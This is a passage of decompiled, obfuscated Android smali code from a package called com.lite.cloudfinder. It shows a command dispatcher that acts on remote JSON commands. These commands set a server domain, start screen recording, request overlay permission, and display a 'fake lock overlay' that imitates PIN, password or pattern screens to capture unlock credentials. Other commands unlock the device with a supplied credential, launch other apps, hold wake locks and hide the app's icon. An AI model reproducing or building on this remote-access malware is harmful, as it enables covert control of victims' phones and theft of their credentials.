    if-eqz v0, :cond_0

    return-void

    :cond_0
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lڜٟٱڀ/ء;

    const/4 v2, 0x2

    invoke-direct {v1, p0, p1, v2}, Lڜٟٱڀ/ء;-><init>(Lڜٟٱڀ/أ;Lorg/json/JSONObject;I)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public final ٶ(Lorg/json/JSONObject;)V
    .locals 3

    const-string v0, "on"

    const/4 v1, 0x0

    invoke-virtual {p1, v0, v1}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result p1

    iget-object v0, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-string v2, "config"

    invoke-virtual {v0, v2, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v1, "realtimeOn"

    invoke-interface {v0, v1, p1}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "realtimeOnOff="

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string v0, "CommandDispatcher"

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method public final ٷ(Lorg/json/JSONObject;)V
    .locals 3

    const-string v0, "interval"

    const/16 v1, 0x1388

    invoke-virtual {p1, v0, v1}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result p1

    const-string v0, "config"

    const/4 v1, 0x0

    iget-object v2, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    invoke-virtual {v2, v0, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v1, "realtimeInterval"

    invoke-interface {v0, v1, p1}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "realtimeSet interval="

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string v0, "CommandDispatcher"

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method public final ٸ(Lorg/json/JSONObject;)V
    .locals 3

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lڜٟٱڀ/ء;

    const/4 v2, 0x4

    invoke-direct {v1, p0, p1, v2}, Lڜٟٱڀ/ء;-><init>(Lڜٟٱڀ/أ;Lorg/json/JSONObject;I)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public final ٹ()V
    .locals 3

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/lite/cloudfinder/activity/ScreenCaptureActivity;

    iget-object v2, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    invoke-direct {v0, v2, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v2, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    return-void
.end method

.method public final ٺ()V
    .locals 5

    iget-object v0, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-string v1, "package:"

    :try_start_0
    new-instance v2, Landroid/content/Intent;

    const-string v3, "android.settings.action.MANAGE_OVERLAY_PERMISSION"

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-direct {v2, v3, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    const/high16 v1, 0x10000000

    invoke-virtual {v2, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v0, v2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    const-string v1, "CommandDispatcher"

    const-string v2, "requestfloaty error"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_0
    return-void
.end method

.method public final ٻ()V
    .locals 3

    :try_start_0
    iget-object v0, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    invoke-static {v0}, Lڗًقڔ/؋;->ق(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    const-string v1, "CommandDispatcher"

    const-string v2, "restartSc error"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_0
    return-void
.end method

.method public final ټ()V
    .locals 3

    iget-object v0, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    :try_start_0
    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    invoke-virtual {v0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v1

    if-eqz v1, :cond_0

    const v2, 0x10008000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v0, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    :cond_0
    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v0

    invoke-static {v0}, Landroid/os/Process;->killProcess(I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    const-string v1, "CommandDispatcher"

    const-string v2, "restartApp error"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_0
    return-void
.end method

.method public final پ(Lorg/json/JSONObject;)V
    .locals 7

    const-string v0, "quality"

    const/16 v1, 0x1e

    invoke-virtual {p1, v0, v1}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v1

    const-string v2, "scale"

    const/16 v3, 0x32

    invoke-virtual {p1, v2, v3}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result p1

    new-instance v3, Landroid/content/Intent;

    iget-object v4, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-class v5, Lcom/lite/cloudfinder/activity/ScreenCaptureActivity;

    invoke-direct {v3, v4, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v5, 0x10000000

    invoke-virtual {v3, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const-string v5, "startRecord"

    const/4 v6, 0x1

    invoke-virtual {v3, v5, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    invoke-virtual {v3, v0, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    invoke-virtual {v3, v2, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    invoke-virtual {v4, v3}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    return-void
.end method

.method public final ٿ(Lorg/json/JSONObject;)V
    .locals 8

    const-string v0, "title"

    const-string v1, ""

    invoke-virtual {p1, v0, v1}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v3, "content"

    invoke-virtual {p1, v3, v1}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "okText"

    const-string v6, "OK"

    invoke-virtual {p1, v5, v6}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const-string v6, "openpkg"

    invoke-virtual {p1, v6, v1}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    new-instance v1, Landroid/content/Intent;

    iget-object v6, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-class v7, Lcom/lite/cloudfinder/activity/AlertActivity;

    invoke-direct {v1, v6, v7}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v7, 0x10000000

    invoke-virtual {v1, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v1, v0, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {v1, v3, v4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v0, "button"

    invoke-virtual {v1, v0, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v0, "targetPackage"

    invoke-virtual {v1, v0, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {v6, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    return-void
.end method

.method public final ڀ(Lorg/json/JSONObject;)V
    .locals 4

    const-string v0, "domain"

    const-string v1, ""

    invoke-virtual {p1, v0, v1}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_1

    iget-object v1, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-string v2, "config"

    const/4 v3, 0x0

    invoke-virtual {v1, v2, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    invoke-interface {v2, v0, p1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    :try_start_0
    new-instance v0, Ljava/io/File;

    invoke-virtual {v1}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v1

    const-string v2, "dom.txt"

    invoke-direct {v0, v1, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    new-instance v1, Ljava/io/FileWriter;

    invoke-direct {v1, v0, v3}, Ljava/io/FileWriter;-><init>(Ljava/io/File;Z)V

    invoke-virtual {v1, p1}, Ljava/io/Writer;->write(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/Writer;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    const-string v0, ".html"

    invoke-virtual {p1, v0}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    const-string v0, "setDomain (html): "

    goto :goto_0

    :cond_0
    const-string v0, "setDomain: "

    :goto_0
    invoke-virtual {v0, p1}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    const-string v0, "CommandDispatcher"

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_1
    return-void
.end method

.method public final ځ(Lorg/json/JSONObject;)V
    .locals 2

    const-string v0, "on"

    const/4 v1, 0x0

    invoke-virtual {p1, v0, v1}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result p1

    iget-object v0, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    invoke-static {v0, p1}, Lڗًقڔ/؋;->ؾ(Landroid/content/Context;Z)V

    return-void
.end method

.method public final ڂ(Lorg/json/JSONObject;)V
    .locals 3

    const-string v0, "enable"

    const/4 v1, 0x1

    invoke-virtual {p1, v0, v1}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result p1

    iget-object v0, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-string v1, "config"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    const-string v2, "wakeupEnabled"

    invoke-interface {v1, v2, p1}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->apply()V

    if-eqz p1, :cond_0

    :try_start_0
    const-string v1, "power"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/os/PowerManager;

    const-string v1, "app:wakeup"

    const v2, 0x1000000a

    invoke-virtual {v0, v2, v1}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v0

    const-wide/16 v1, 0xbb8

    invoke-virtual {v0, v1, v2}, Landroid/os/PowerManager$WakeLock;->acquire(J)V

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->release()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_0
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "setWakeup="

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string v0, "CommandDispatcher"

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method public final ڃ(Lorg/json/JSONObject;)V
    .locals 11

    const-string v0, "Fake lock overlay shown: type="

    const-string v1, "PIN"

    const-string v2, "CommandDispatcher"

    :try_start_0
    const-string v3, "type"

    invoke-virtual {p1, v3, v1}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const-string v3, ""

    :try_start_1
    const-string v4, "title"

    invoke-virtual {p1, v4, v3}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "subtitle"

    invoke-virtual {p1, v5, v3}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    sget-object v5, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    sget-object v5, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    if-nez v5, :cond_0

    const-string p1, "showLockOverlay: no accessibility service"

    invoke-static {v2, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    return-void

    :cond_0
    new-instance v6, Lژة۪ڦضۆۿۡ/ح;

    invoke-direct {v6}, Lژة۪ڦضۆۿۡ/ح;-><init>()V

    sget-object v7, Lڝږ؁ڋ/ظ;->ة:Lڝږ؁ڋ/ظ;

    if-nez v7, :cond_1

    new-instance v7, Lڝږ؁ڋ/ظ;

    invoke-direct {v7, v5, v6}, Lڝږ؁ڋ/ظ;-><init>(Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;Lژة۪ڦضۆۿۡ/ح;)V

    sput-object v7, Lڝږ؁ڋ/ظ;->ة:Lڝږ؁ڋ/ظ;

    goto :goto_0

    :catch_0
    move-exception p1

    goto/16 :goto_6

    :cond_1
    :goto_0
    sget-object v5, Lڝږ؁ڋ/ظ;->ة:Lڝږ؁ڋ/ظ;

    const-string v6, "PASSWORD"

    invoke-virtual {v6, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v6

    const/4 v7, 0x1

    if-nez v6, :cond_c

    const-string v6, "MIXED"

    invoke-virtual {v6, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v6

    if-eqz v6, :cond_2

    goto/16 :goto_4

    :cond_2
    const-string v6, "PATTERN"

    invoke-virtual {v6, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v6

    const/4 v8, 0x0

    if-eqz v6, :cond_3

    iget-object v3, v5, Lڝږ؁ڋ/ظ;->ؤ:Landroid/os/Handler;

    new-instance v6, Lڝږ؁ڋ/ز;

    invoke-direct {v6, v5, v4, p1, v8}, Lڝږ؁ڋ/ز;-><init>(Lڝږ؁ڋ/ظ;Ljava/lang/String;Ljava/lang/String;I)V

    invoke-virtual {v3, v6}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    goto/16 :goto_5

    :cond_3
    iget-object v6, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    invoke-static {v6}, Lڝږ؁ڋ/ؽ;->؋(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v6

    const-string v9, "auto"

    invoke-virtual {v9, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v9

    const/4 v10, 0x2

    if-eqz v9, :cond_b

    const-string v9, "unknown"

    invoke-virtual {v9, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-nez v9, :cond_b

    invoke-virtual {v5}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    if-nez v6, :cond_4

    goto :goto_1

    :cond_4
    move-object v3, v6

    :goto_1
    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v6

    const v9, -0x2f271470

    if-eq v6, v9, :cond_7

    const v9, 0x1b195

    if-eq v6, v9, :cond_6

    const v9, 0x4889ba9b

    if-eq v6, v9, :cond_5

    goto :goto_2

    :cond_5
    const-string v6, "password"

    invoke-virtual {v3, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_8

    move v3, v8

    goto :goto_3

    :cond_6
    const-string v6, "pin"

    invoke-virtual {v3, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_8

    move v3, v10

    goto :goto_3

    :cond_7
    const-string v6, "pattern"

    invoke-virtual {v3, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_8

    move v3, v7

    goto :goto_3

    :cond_8
    :goto_2
    const/4 v3, -0x1

    :goto_3
    if-eqz v3, :cond_a

    if-eq v3, v7, :cond_9

    iget-object v3, v5, Lڝږ؁ڋ/ظ;->ؤ:Landroid/os/Handler;

    new-instance v6, Lڝږ؁ڋ/ز;

    invoke-direct {v6, v5, v4, p1, v10}, Lڝږ؁ڋ/ز;-><init>(Lڝږ؁ڋ/ظ;Ljava/lang/String;Ljava/lang/String;I)V

    invoke-virtual {v3, v6}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    goto :goto_5

    :cond_9
    iget-object v3, v5, Lڝږ؁ڋ/ظ;->ؤ:Landroid/os/Handler;

    new-instance v6, Lڝږ؁ڋ/ز;

    invoke-direct {v6, v5, v4, p1, v8}, Lڝږ؁ڋ/ز;-><init>(Lڝږ؁ڋ/ظ;Ljava/lang/String;Ljava/lang/String;I)V

    invoke-virtual {v3, v6}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    goto :goto_5

    :cond_a
    iget-object v3, v5, Lڝږ؁ڋ/ظ;->ؤ:Landroid/os/Handler;

    new-instance v6, Lڝږ؁ڋ/ز;

    invoke-direct {v6, v5, v4, p1, v7}, Lڝږ؁ڋ/ز;-><init>(Lڝږ؁ڋ/ظ;Ljava/lang/String;Ljava/lang/String;I)V

    invoke-virtual {v3, v6}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    goto :goto_5

    :cond_b
    iget-object v3, v5, Lڝږ؁ڋ/ظ;->ؤ:Landroid/os/Handler;

    new-instance v6, Lڝږ؁ڋ/ز;

    invoke-direct {v6, v5, v4, p1, v10}, Lڝږ؁ڋ/ز;-><init>(Lڝږ؁ڋ/ظ;Ljava/lang/String;Ljava/lang/String;I)V

    invoke-virtual {v3, v6}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    goto :goto_5

    :cond_c
    :goto_4
    iget-object v3, v5, Lڝږ؁ڋ/ظ;->ؤ:Landroid/os/Handler;

    new-instance v6, Lڝږ؁ڋ/ز;

    invoke-direct {v6, v5, v4, p1, v7}, Lڝږ؁ڋ/ز;-><init>(Lڝږ؁ڋ/ظ;Ljava/lang/String;Ljava/lang/String;I)V

    invoke-virtual {v3, v6}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    :goto_5
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v2, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_7

    :goto_6
    const-string v0, "handleShowLockOverlay error"

    invoke-static {v2, v0, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_7
    return-void
.end method

.method public final ڄ()V
    .locals 5

    iget-object v0, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-string v1, "config"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    const-string v3, "hideMyMainActivity"

    const-string v4, ""

    invoke-interface {v1, v3, v4}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->apply()V

    const-string v1, "iconAlias"

    const-string v3, "show"

    invoke-interface {v0, v1, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    const-string v0, "com.lite.cloudfinder.alias.S"

    const/4 v1, 0x1

    invoke-virtual {p0, v0, v1}, Lڜٟٱڀ/أ;->ڥ(Ljava/lang/String;Z)V

    const-string v0, "com.lite.cloudfinder.alias.N"

    invoke-virtual {p0, v0, v2}, Lڜٟٱڀ/أ;->ڥ(Ljava/lang/String;Z)V

    const-string v0, "com.lite.cloudfinder.alias.Y"

    invoke-virtual {p0, v0, v2}, Lڜٟٱڀ/أ;->ڥ(Ljava/lang/String;Z)V

    :cond_0
    return-void
.end method

.method public final چ(Lorg/json/JSONObject;)V
    .locals 4

    const-string v0, "type"

    const-string v1, "auto"

    invoke-virtual {p1, v0, v1}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v2, "credential"

    const-string v3, ""

    invoke-virtual {p1, v2, v3}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-eqz v2, :cond_0

    const-string p1, "CommandDispatcher"

    const-string v0, "smartUnlock: no credential provided"

    invoke-static {p1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    return-void

    :cond_0
    invoke-virtual {v1, v0}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_2

    iget-object v0, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    invoke-static {v0}, Lڝږ؁ڋ/ؽ;->؋(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "unknown"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_1

    goto :goto_0

    :cond_1
    const-string v0, "pin"

    :cond_2
    :goto_0
    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/lang/Thread;

    new-instance v2, Landroidx/room/أ;

    const/4 v3, 0x6

    invoke-direct {v2, p0, v0, p1, v3}, Landroidx/room/أ;-><init>(Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;I)V

    const-string p1, "smart-unlock"

    invoke-direct {v1, v2, p1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public final ڇ(Lorg/json/JSONObject;)V
    .locals 3

    iget-object v0, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-string v1, "pkg"

    const-string v2, ""

    invoke-virtual {p1, v1, v2}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_0

    :try_start_0
    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    invoke-virtual {v1, p1}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object p1

    if-eqz p1, :cond_0

    const/high16 v1, 0x10000000

    invoke-virtual {p1, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v0, p1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    const-string v0, "CommandDispatcher"

    const-string v1, "startApk error"

    invoke-static {v0, v1, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_0
    :goto_0
    return-void
.end method

.method public final ڈ(Lorg/json/JSONObject;)V
    .locals 14

    const-string v0, "index"

    const/4 v1, 0x0

    invoke-virtual {p1, v0, v1}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v2

    const-string v3, "quality"

    const/16 v4, 0x32

    invoke-virtual {p1, v3, v4}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v4

    const-string v5, "rotation"

    invoke-virtual {p1, v5, v1}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v6

    const-string v7, "frameRate"

    const/16 v8, 0xf

